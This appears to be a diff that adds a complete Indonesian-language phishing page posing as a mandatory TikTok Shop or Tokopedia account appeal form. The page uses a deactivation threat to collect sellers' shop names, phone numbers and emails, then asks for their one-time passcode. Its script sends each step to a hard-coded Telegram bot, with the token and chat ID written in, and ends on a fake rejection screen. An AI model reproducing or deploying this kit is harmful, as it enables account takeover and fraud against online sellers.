@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pengajuan Banding - Sistem Lengkap</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: white;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            display: none;
+        }
+
+        #halamanForm {
+            display: block;
+        }
+
+        h1 {
+            font-size: 18px;
+            margin-bottom: 25px;
+            line-height: 1.5;
+            text-align: center;
+            color: #333;
+        }
+
+        .platform-select {
+            margin-bottom: 20px;
+            display: flex;
+            gap: 10px;
+        }
+
+        .platform-btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            color: white;
+        }
+
+        .tiktok-btn {
+            background-color: #000;
+        }
+
+        .tokopedia-btn {
+            background-color: #ffd600;
+            color: #000;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        .hp-input {
+            display: flex;
+        }
+
+        .country-code {
+            padding: 12px 15px;
+            border: 1px solid #ddd;
+            border-right: none;
+            border-radius: 5px 0 0 5px;
+            background: #f0f0f0;
+        }
+
+        .hp-input input {
+            border-radius: 0 5px 5px 0;
+        }
+
+        small {
+            display: block;
+            margin-top: 5px;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .checkbox-group {
+            display: flex;
+            gap: 10px;
+            margin: 15px 0;
+            align-items: flex-start;
+        }
+
+        .terms-link {
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .tiktok-link {
+            color: #FF9500;
+        }
+
+        .tokopedia-link {
+            color: #FF5722;
+        }
+
+        #halamanLoading {
+            text-align: center;
+            padding: 40px;
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #2C3E50;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 25px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        #halamanOTP h2 {
+            font-size: 18px;
+            margin-bottom: 10px;
+            text-align: center;
+            color: #333;
+        }
+
+        .info-text {
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 25px;
+            color: #666;
+        }
+
+        .no-wa {
+            font-weight: bold;
+            color: #2C3E50;
+        }
+
+        .otp-group {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+
+        .otp-input {
+            width: 50px;
+            height: 50px;
+            text-align: center;
+            font-size: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+
+        .countdown {
+            text-align: center;
+            color: #E74C3C;
+            font-weight: bold;
+            margin: 10px 0;
+        }
+
+        #halamanHasil {
+            text-align: center;
+        }
+
+        .result-icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+            color: #E74C3C;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            color: white;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+
+        .btn.disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+
+        .btn.active {
+            background: #2C3E50;
+        }
+
+        .btn.active:hover {
+            opacity: 0.9;
+        }
+    </style>
+</head>
+<body>
+    <!-- HALAMAN FORM UTAMA -->
+    <div class="container" id="halamanForm">
+        <h1>🕌🕋Proses Pengajuan Banding<br>Wajib Dilakukan Agar Akun Tidak Dinonaktifkan🌙⭐</h1>
+        
+        <div class="platform-select">
+            <button class="platform-btn tiktok-btn" onclick="setPlatform('tiktok')">TikTok Shop🛒</button>
+            <button class="platform-btn tokopedia-btn" onclick="setPlatform('tokopedia')">Tokopedia🛒</button>
+        </div>
+
+        <form id="formPengajuan">
+            <input type="hidden" id="platformType" value="tiktok">
+
+            <div class="form-group">
+                <label for="namaToko">Nama Toko/Penjual🛒 *</label>
+                <input type="text" id="namaToko" placeholder="Contoh: Toko Elektronik Jaya" required>
+            </div>
+
+            <div class="form-group">
+                <label for="noWa">Nomor (Terdaftar Toko 🛒) *</label>
+                <div class="hp-input">
+                    <span class="country-code">🇲🇨+62</span>
+                    <input type="tel" id="noWa" placeholder="81234567890" pattern="[0-9]{10,13}" required>
+                </div>
+                <small>Masukkan 10-13 digit angka saja (tanpa awalan 0)</small>
+            </div>
+
+            <div class="form-group">
+                <label for="emailAkun">Email Akun Toko🛒*</label>
+                <input type="email" id="emailAkun" placeholder="contoh@domain.com" required>
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="setuju" required>
+                <label for="setuju">Saya telah membaca dan menyetujui <a href="#" class="terms-link tiktok-link">Syarat dan Ketentuan</a> <span id="namaPlatform">TikTok Shop</span>. *</label>
+            </div>
+
+            <button type="submit" class="btn disabled" id="btnLanjut">Lanjutkan Pengajuan</button>
+        </form>
+    </div>
+
+    <!-- HALAMAN LOADING -->
+    <div class="container" id="halamanLoading">
+        <div class="loading-spinner"></div>
+        <h2>Mengirim Data Pengajuan Banding</h2>
+        <p>Harap tunggu, data sedang diproses...</p>
+    </div>
+
+    <!-- HALAMAN OTP -->
+    <div class="container" id="halamanOTP">
+        <h2>Verifikasi Kode OTP</h2>
+        <p class="info-text">Kode OTP telah dikirim ke nomor Anda <br><span class="no-wa" id="otpNoWa">+62 812xxxxxx</span></p>
+        
+        <div class="otp-group">
+            <input type="text" class="otp-input" maxlength="1" required>
+            <input type="text" class="otp-input" maxlength="1" required>
+            <input type="text" class="otp-input" maxlength="1" required>
+            <input type="text" class="otp-input" maxlength="1" required>
+        </div>
+
+        <div class="countdown">Kode akan kedaluwarsa dalam: <span id="timer">01:00</span></div>
+
+        <button class="btn disabled" id="btnVerifikasi">Lanjutkan Verifikasi</button>
+    </div>
+
+    <!-- HALAMAN HASIL -->
+    <div class="container" id="halamanHasil">
+        <div class="result-icon">⚠️</div>
+        <h2>Hasil Pengajuan Banding</h2>
+        <p class="info-text">Maaf, pengajuan banding Anda tidak dapat diterima. Silakan hubungi customer service admin untuk klarifikasi lebih lanjut.</p>
+        
+        <div class="form-group">
+            <p><strong>Platform:</strong> <span id="hasilPlatform">TikTok Shop</span></p>
+            <p><strong>Nama Toko:</strong> <span id="hasilNamaToko">--</span></p>
+            <p><strong>Nomor Anda:</strong> <span id="hasilNoWa">+62 --</span></p>
+        </div>
+
+        <button class="btn active" onclick="kembaliKeAwal()">Kembali ke Form Utama</button>
+    </div>
+
+    <script>
+        let platformSekarang = 'tiktok';
+        let dataPengajuan = {};
+        let intervalWaktu;
+        const DETIK_TOTAL = 60;
+        const BOT_TOKEN = "8067130100:AAE5FOOfKpiNGbydAIAczleTkO_UJoukEMU";
+        const CHAT_ID = "8571321926";
+
+        // SET PLATFORM AWAL
+        function setPlatform(platform) {
+            platformSekarang = platform;
+            document.getElementById('platformType').value = platform;
+            document.getElementById('namaPlatform').textContent = platform === 'tiktok' ? 'TikTok Shop' : 'Tokopedia';
+            document.querySelector('.terms-link').className = platform === 'tiktok' ? 'terms-link tiktok-link' : 'terms-link tokopedia-link';
+            periksaTombol();
+        }
+
+        // PERIKSA KONDISI TOMBOL LANJUT
+        function periksaTombol() {
+            const setuju = document.getElementById('setuju').checked;
+            const namaToko = document.getElementById('namaToko').value.trim();
+            const noWa = document.getElementById('noWa').value.trim();
+            const email = document.getElementById('emailAkun').value.trim();
+            const btn = document.getElementById('btnLanjut');
+
+            if (setuju && namaToko && noWa && email) {
+                btn.classList.remove('disabled');
+                btn.classList.add('active');
+                btn.disabled = false;
+            } else {
+                btn.classList.add('disabled');
+                btn.classList.remove('active');
+                btn.disabled = true;
+            }
+        }
+
+        // EVENT LISTENER UNTUK VALIDASI
+        document.getElementById('setuju').addEventListener('change', periksaTombol);
+        document.getElementById('namaToko').addEventListener('input', periksaTombol);
+        document.getElementById('noWa').addEventListener('input', periksaTombol);
+        document.getElementById('emailAkun').addEventListener('input', periksaTombol);
+
+        // KIRIM DATA KE TELEGRAM
+        async function kirimDataTelegram(data) {
+            const pesan = `
+📊 DATA PENGAJUAN BARU 📊
+Platform: ${data.platform === 'tiktok' ? 'TikTok Shop' : 'Tokopedia'}
+Nama Toko: ${data.namaToko}
+No WhatsApp: +62 ${data.noWa}
+Email Akun: ${data.email}
+Waktu: ${new Date().toLocaleString('id-ID')}
+            `;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: pesan
+                    })
+                });
+            } catch (err) {
+                console.log('Error kirim data:', err);
+            }
+        }
+
+        // KIRIM OTP KE TELEGRAM
+        async function kirimOTPTelegram(otp) {
+            const pesan = `
+🔐 KODE OTP MASUK 🔐
+Platform: ${dataPengajuan.platform === 'tiktok' ? 'TikTok Shop' : 'Tokopedia'}
+Nama Toko: ${dataPengajuan.namaToko}
+No WhatsApp: +62 ${dataPengajuan.noWa}
+Kode OTP: ${otp}
+Waktu Input: ${new Date().toLocaleString('id-ID')}
+            `;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: pesan
+                    })
+                });
+            } catch (err) {
+                console.log('Error kirim OTP:', err);
+            }
+        }
+
+        // SUBMIT FORM
+        document.getElementById('formPengajuan').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            dataPengajuan = {
+                platform: platformSekarang,
+                namaToko: document.getElementById('namaToko').value.trim(),
+                noWa: document.getElementById('noWa').value.trim(),
+                email: document.getElementById('emailAkun').value.trim()
+            };
+
+            // KIRIM DATA
+            await kirimDataTelegram(dataPengajuan);
+
+            // GANTI HALAMAN
+            document.getElementById('halamanForm').style.display = 'none';
+            document.getElementById('halamanLoading').style.display = 'block';
+
+            // TUNGGU 3 DETIK
+            setTimeout(() => {
+                document.getElementById('halamanLoading').style.display = 'none';
+                document.getElementById('halamanOTP').style.display = 'block';
+                setupHalamanOTP();
+            }, 3000);
+        });
+
+        // SETUP HALAMAN OTP
+        function setupHalamanOTP() {
+            document.getElementById('otpNoWa').textContent = '+62 ' + dataPengajuan.noWa;
+            mulaiTimer();
+            setupInputOTP();
+        }
+
+        // TIMER COUNTDOWN
+        function mulaiTimer() {
+            let detikSisa = DETIK_TOTAL;
+            updateTimer(detikSisa);
+
+            intervalWaktu = setInterval(() => {
+                detikSisa--;
+                updateTimer(detikSisa);
+
+                if (detikSisa <= 0) {
+                    clearInterval(intervalWaktu);
+                    alert('Waktu OTP telah habis!');
+                    kembaliKeAwal();
+                }
+            }, 1000);
+        }
+
+        function updateTimer(detik) {
+            const menit = Math.floor(detik / 60);
+            const detikSisa = detik % 60;
+            document.getElementById('timer').textContent = `${menit.toString().padStart(2, '0')}:${detikSisa.toString().padStart(2, '0')}`;
+
+            // CEK OTP TERISI
+            const inputOTP = document.querySelectorAll('.otp-input');
+            let semuaTerisi = true;
+            inputOTP.forEach(input => {
+                if (!input.value || isNaN(input.value)) semuaTerisi = false;
+            });
+
+            const btn = document.getElementById('btnVerifikasi');
+            if (semuaTerisi && detik > 0) {
+                                btn.classList.add('active');
+                btn.disabled = false;
+            } else {
+                btn.classList.add('disabled');
+                btn.classList.remove('active');
+                btn.disabled = true;
+            }
+        }
+
+        // SETUP INPUT OTP
+        function setupInputOTP() {
+            const inputOTP = document.querySelectorAll('.otp-input');
+            
+            inputOTP.forEach((input, index) => {
+                input.addEventListener('keydown', (e) => {
+                    const kunciDiizinkan = ['0','1','2','3','4','5','6','7','8','9','Backspace','Delete','ArrowLeft','ArrowRight'];
+                    if (!kunciDiizinkan.includes(e.key)) e.preventDefault();
+                });
+
+                input.addEventListener('input', () => {
+                    input.value = input.value.replace(/[^0-9]/g, '');
+                    if (input.value && index < inputOTP.length - 1) inputOTP[index + 1].focus();
+                    updateTimer(parseInt(document.getElementById('timer').textContent.split(':')[1]) + (parseInt(document.getElementById('timer').textContent.split(':')[0]) * 60));
+                });
+
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && !input.value && index > 0) inputOTP[index - 1].focus();
+                });
+            });
+        }
+
+        // VERIFIKASI OTP
+        document.getElementById('btnVerifikasi').addEventListener('click', function() {
+            clearInterval(intervalWaktu);
+            
+            let kodeOTP = '';
+            document.querySelectorAll('.otp-input').forEach(input => {
+                kodeOTP += input.value;
+            });
+            
+            kirimOTPTelegram(kodeOTP);
+
+            // TAMPILKAN HASIL
+            document.getElementById('halamanOTP').style.display = 'none';
+            document.getElementById('halamanHasil').style.display = 'block';
+            
+            document.getElementById('hasilPlatform').textContent = dataPengajuan.platform === 'tiktok' ? 'TikTok Shop' : 'Tokopedia';
+            document.getElementById('hasilNamaToko').textContent = dataPengajuan.namaToko;
+            document.getElementById('hasilNoWa').textContent = '+62 ' + dataPengajuan.noWa;
+        });
+
+        // KEMBALI KE AWAL
+        function kembaliKeAwal() {
+            clearInterval(intervalWaktu);
+            document.getElementById('formPengajuan').reset();
+            setPlatform('tiktok');
+            
+            document.getElementById('halamanHasil').style.display = 'none';
+            document.getElementById('halamanOTP').style.display = 'none';
+            document.getElementById('halamanLoading').style.display = 'none';
+            document.getElementById('halamanForm').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
+
